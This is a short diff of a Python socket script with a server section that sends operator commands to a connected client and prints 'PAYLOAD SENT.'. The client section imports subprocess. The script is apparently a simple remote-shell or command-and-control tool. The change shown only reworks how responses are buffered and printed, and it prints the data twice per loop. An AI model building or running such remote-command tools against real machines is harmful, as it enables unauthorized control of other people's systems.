@@ -1,5 +1,4 @@
 #### server ####
-
 from __future__ import print_function
 import socket
 import sys
@@ -82,8 +81,15 @@ def ssend(conn):
                 print('PAYLOAD SENT.')
         elif len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024))
-            print(client_response, end="")
+            data = ''           
+            while True:
+                client_response = str(conn.recv(1024))
+                data += client_response
+                print(data)
+                if len(client_response) < 1024:
+                    break
+                #print(data, end="")
+                print(data)
 
 
 def main():
@@ -93,9 +99,8 @@ def main():
 
 main()
 
+## client ##
 
-
-#### client #####
 import os
 import socket
 import subprocess
@@ -193,3 +198,4 @@ def main():
 
 
 main()
+
